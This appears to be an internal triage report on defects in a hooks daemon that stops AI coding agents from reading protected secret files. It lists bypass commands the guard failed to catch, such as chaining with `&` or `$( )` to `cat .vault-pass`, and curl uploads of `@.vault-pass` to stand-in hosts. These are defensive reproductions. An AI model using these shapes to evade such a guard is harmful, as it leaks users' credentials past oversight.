# Plan 00483 Task 2.1: triage of carried entries, batch A

Scope: `CLAUDE/Plan/00474-niggles-ledger-seventeen/CARRIED-REFIX-BRANCHES.md`, the entries under
branches `worktree-upgrade-scripts`, `worktree-d-00421`, `worktree-plan-464-commit-gate-repo` and
`agent-aa0e5105724aa123b-b9ce2f39`. That is 18 entries.

Method: each entry was checked against current main. Command shapes were run with
`bin/hooks-daemon probe PreToolUse`, using made-up paths that match a protected glob by name only
(`.vault-pass`). Code and batch-script entries were run with small Python scripts under
`untracked/scratch/p483-a/`. The test applied is the two-part test in ARCHITECTURE.md
(limb 1: text not visible at call time; limb 2: no working purpose but defeating a parser).

Two entries cite code that does not exist on main (N119, N173). They are marked FIXED-ON-MAIN
with "code absent".

Counts: FIXED-ON-MAIN 6, IN-SCOPE DEFECT 7, DISMISSED (threat model) 4, NEEDS-OWNER 1,
KEEP-FAIL-CLOSED 0.

| Entry | Verdict                                                           | Shape / limb or repro                                                                                                                                                          | Evidence                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ----- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| N108  | FIXED-ON-MAIN                                                     | `git -C DIR \` + newline + subcommand                                                                                                                                          | Probes: `git -C /tmp \<nl> status`, `git -c k=v \<nl> diff`, `git --git-dir=… \<nl> show HEAD` all allowed; `git -C /tmp \<nl> reset --hard` still denied (R-GIT-RESET-HARD).                                                                                                                                                                                                                                                                |
| N121  | FIXED-ON-MAIN                                                     | Three shapes: grep regex read as path; flaggable channel naming an unrelated path; enumeration error on a big scratch tree                                                     | `grep -n '^class .*Handler' f`, `grep -a 'Error' untracked/scratch/m3.out`, `grep -n "trap " scripts/install/*.sh` all allowed. With 2600 files in one directory, 7 glob commands over it were all allowed. The 600k-file case was not rebuilt. Glob walks are rooted at the named directory (`bounded_recursive_glob`), not the whole tree.                                                                                                 |
| N170  | IN-SCOPE DEFECT                                                   | `secret-meta`/`git rm --cached` exemption applies to a compound with a lone `&`, `$( )` or backticks                                                                           | See section below.                                                                                                                                                                                                                                                                                                                                                                                                                           |
| N171  | IN-SCOPE DEFECT                                                   | Ordinary condition (a directory that cannot be listed), no shape                                                                                                               | `scan_scope.walk_files` uses `os.walk` with no `onerror`. See section below.                                                                                                                                                                                                                                                                                                                                                                 |
| N172  | IN-SCOPE DEFECT                                                   | Ordinary condition (batch check run by an interpreter without the daemon package)                                                                                              | `resolve_term_matcher` returns a matcher that never matches; `resolve_secret_terms` returns `()`. See section below.                                                                                                                                                                                                                                                                                                                         |
| N173  | FIXED-ON-MAIN (code absent)                                       | n/a                                                                                                                                                                            | No last-known-good snapshot, marker or `bash_git_config_key_write` exists in `src/` or `scripts/` on main. The defect cannot occur.                                                                                                                                                                                                                                                                                                          |
| N174  | DISMISSED (threat model)                                          | A name equal to `..` or starting with `-` joined onto a directory. Limb 2 (no working purpose); the one live case is a harness-supplied session id                             | URL capture path (`derive_relative_path`) and approval key (`_normalise_key`, `..` becomes `__`) already refuse traversal on main. Residual: `_sidecar_dir` keeps `..` as a session id; Claude Code supplies the id, so no agent shape reaches it. Agent name, ledger year and report versions are not agent-typed paths on main.                                                                                                            |
| N175  | DISMISSED (threat model)                                          | A project-config option key named after an internal attribute. Limb 2: editing config to disable a guard is the same act as `enabled: false`, which the daemon does not defend | `apply_handler_options` still does a blind `setattr(instance, f"_{key}", value)` (`registry.py:333`). A typo that collides with an internal name is not a realistic ordinary mistake. The warning for undeclared options is a nice-to-have, not a defence.                                                                                                                                                                                   |
| N228  | DISMISSED (threat model)                                          | Residual: `ansible-vault vi''ew`, `de\crypt` (quote or backslash split inside a word). Limb 2                                                                                  | The `git rm --cached` shapes are FIXED on main: a closed option grammar (N253) denies `--pathspec-from=`, `'--pathspec-from-file'=` and `--pathspec-from-file=` (probes denied). Plain `ansible-vault view` and `'view'` are denied. The two split spellings are allowed on main; they have no purpose except defeating the word test. `ansible-vault edit` is exempt on main but opens `$EDITOR`, which prints nothing in an agent session. |
| N229  | IN-SCOPE DEFECT                                                   | `@FILE` and attached short-option values go unseen by the mention scan                                                                                                         | See section below.                                                                                                                                                                                                                                                                                                                                                                                                                           |
| N230  | Fixed (branch worktree-p483-n154-n230, not yet merged; Fable FIX) | `secret-meta --project-root DIR` reads `allow_plain_hash` from a config the agent wrote                                                                                        | `cmd_secret_meta` (`cli.py:6439-6451`) still trusts the override. `--project-root` is a documented flag (working purpose), but the exploit needs a hand-made config whose only job is to self-grant. It discloses exact size and plain sha256, not content. Owner decides whether a self-granting config counts.                                                                                                                             |
| N231  | FIXED-ON-MAIN                                                     | n/a                                                                                                                                                                            | Merge 4135dc7f0. Probe script: a directory in place of the list raises `SecretWordListUnreadableError`; an absent list gives `()`.                                                                                                                                                                                                                                                                                                           |
| N242  | IN-SCOPE DEFECT                                                   | `python -m pkg.secret_x` denied as a path mention (false positive)                                                                                                             | See section below. The grep half is fixed on main.                                                                                                                                                                                                                                                                                                                                                                                           |
| N243  | DISMISSED (threat model)                                          | A self-written executable named `./ansible-playbook`. Limb 1 (the script body is a file, not visible at the call)                                                              | Probe: `./ansible-playbook --vault-password-file .vault-pass site.yml` and `.venv/bin/ansible-playbook …` are both allowed on main. The remedy on the dropped branch denies `.venv/bin/ansible-playbook`, which is an ordinary spelling, so it would add an in-scope false positive. Leave as is.                                                                                                                                            |
| N248  | IN-SCOPE DEFECT                                                   | Ordinary run of `scripts/debug_info.py`                                                                                                                                        | See section below.                                                                                                                                                                                                                                                                                                                                                                                                                           |
| N250  | IN-SCOPE DEFECT                                                   | Ordinary condition (project config that does not parse)                                                                                                                        | See section below.                                                                                                                                                                                                                                                                                                                                                                                                                           |
| N119  | FIXED-ON-MAIN (code absent)                                       | n/a                                                                                                                                                                            | `utils/git_command_target.py` does not exist on main. A 20-deep literal `eval eval … true` is answered in 0.49 s (denied, R-SECRET-READ, depth cap). Such a chain has no working purpose anyway (limb 2).                                                                                                                                                                                                                                    |
| N41   | FIXED-ON-MAIN                                                     | n/a                                                                                                                                                                            | A 96,000-byte command of 9,600 `cat <<'E'` openers runs through the whole chain in 1.2 s wall clock including process start, and is denied. The ledger target was under 2 s.                                                                                                                                                                                                                                                                 |

## IN-SCOPE DEFECT: N170

The `secret-meta` and `git rm --cached` exemptions look only for `;`, `&&`, `||`, `|` and newline
(`_COMMAND_SEPARATORS`) and `<(`. A lone `&`, `$( )` and backticks pass.
Outcome at risk: protected file contents reach context.

Reproduction (all run through `probe`, all ALLOWED on main; `cat .vault-pass` alone and
`ls & cat .vault-pass` are denied):

- `bin/hooks-daemon secret-meta x & cat .vault-pass`
- `git rm --cached foo & cat .vault-pass`
- `bin/hooks-daemon secret-meta $(cat .vault-pass)` and the backtick form
- `git rm --cached foo $(cat .vault-pass)`

`&&`, `;` and newline forms are denied. Both `&` and one level of `$( )` have a working purpose and
are visible, so they are in scope. The fix is in `is_exempt_invocation`
(`secret_file_matching.py:2581-2609`): refuse any operator and any substitution.

## IN-SCOPE DEFECT: N171

Outcome at risk: a QA walker reports a tree clean without reading part of it.
Reproduction: `untracked/scratch/p483-a/w171.py` patches `os.scandir` to fail on one subdirectory
(root can ignore chmod). `scan_scope.walk_files(root)` returns `[]` with no error, though
`sub/a.py` exists. The cause is `os.walk` with no `onerror` (`scan_scope.py:40`).

## IN-SCOPE DEFECT: N172

Outcome at risk: the history and sensitive-content sweeps report clean while checking no term.
Reproduction: `/usr/bin/python3 untracked/scratch/p483-a/w172.py` (no daemon package on that
interpreter). `check_git_history.resolve_term_matcher()` returns `_never_matches`;
`resolve_secret_terms()` returns an empty tuple. Same `except ImportError` fallbacks sit in
`check_sensitive_content.py` (lines 158, 199, 298, 324) and `check_git_history.py` (280, 288, 301).
A careless run under the wrong interpreter is an ordinary event. This is the fail-closed class from
"What this ruling does not change".

## IN-SCOPE DEFECT: N229

The mention scan does not see a protected name after `@`, or one attached to a short option.
Outcome at risk: a protected file read or sent out without a deny. All ALLOWED on main (the
spaced or `./`-prefixed forms are denied):

- `curl -d @.vault-pass http://x`
- `curl -X POST --data-binary @.vault-pass https://example.com/upload`
- `curl -F f=@.vault-pass http://x`, `curl -d@.vault-pass http://x`
- `ansible-playbook -e @.vault-pass x.yml`, `-e@.vault-pass`, `--extra-vars=@.vault-pass`
- `grep -f.vault-pass README.md`, `awk -f.vault-pass README.md`, `ansible-playbook -i.vault-pass x.yml`

Denied for comparison: `curl -d @./.vault-pass`, `grep -f .vault-pass README.md`,
`grep --file=.vault-pass`, `curl --data @~/.vault-pass`. `curl -d @file` and `grep -fFILE` are
ordinary spellings. The extra attached-value reading added in N253 inside `is_exempt_invocation`
only runs after a mention is found, so it does not help here.

## IN-SCOPE DEFECT: N242

False positive: `python -m` with a dotted module whose name contains `secret`.
`python -m claude_code_hooks_daemon.utils.secret_redaction` and `python3 -m scripts.secret_tool`
are DENIED (R-SECRET-BASH-MENTION, glob `*.secret*` matched against the dotted text). Python
opens `claude_code_hooks_daemon/utils/secret_redaction.py`, not a file with that dotted name.
`python -m pytest tests/unit/test_secret_file_matching.py` is allowed. The quoted-grep half of N242
is fixed on main (`grep -n '.*get_active' …` allowed). The same denial hit this triage when a
module name appeared in a heredoc body.

## IN-SCOPE DEFECT: N248

Outcome at risk: a bug report built by `scripts/debug_info.py` goes out with project secret terms
unredacted and no warning. The script never initialises `ProjectContext`.
Reproduction: `untracked/scratch/p483-a/w248.py` (fresh interpreter, no context):
`secret_redaction.get_active_secret_terms()` returns an empty tuple, and `project_secret_terms`
does not exist on main. `debug_info._secret_terms` takes that `()` as a real answer, so the
"Secret word list not applied" banner (shown only for `None`) never appears
(`scripts/debug_info.py:150-167`). Only paths and hostname are scrubbed.

## IN-SCOPE DEFECT: N250

Outcome at risk: a fetched page that holds a secret term is written to the vendored tree unscanned.
Reproduction: `untracked/scratch/p483-a/w250.py` builds a project whose
`.claude/hooks-daemon.yaml` does not parse. `cli._sensitive_content_guard(root)` returns `None`
after a stderr warning, and `remote-docs add` then captures without scanning
(`cli.py:7494-7525`, with the "proceeds UNSCANNED" docstring). The commit gate still scans staged
content, which limits the harm to the working tree. A config typo is an ordinary trigger.
